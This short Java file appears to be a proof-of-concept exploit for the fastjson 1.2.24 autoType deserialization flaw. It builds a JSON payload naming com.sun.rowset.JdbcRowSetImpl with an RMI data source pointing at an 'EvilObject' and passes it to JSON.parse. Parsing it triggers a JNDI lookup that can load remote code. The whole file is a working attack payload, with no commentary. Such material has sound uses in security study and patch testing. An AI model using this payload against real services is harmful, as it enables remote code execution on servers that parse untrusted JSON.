import com.alibaba.fastjson.JSON;

//@dependency{fastjson:1.2.24}
public class jdbcrowsetimpl {
    public static void main(String args[]) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true}";
        Object res = JSON.parse(payload);

    }
}
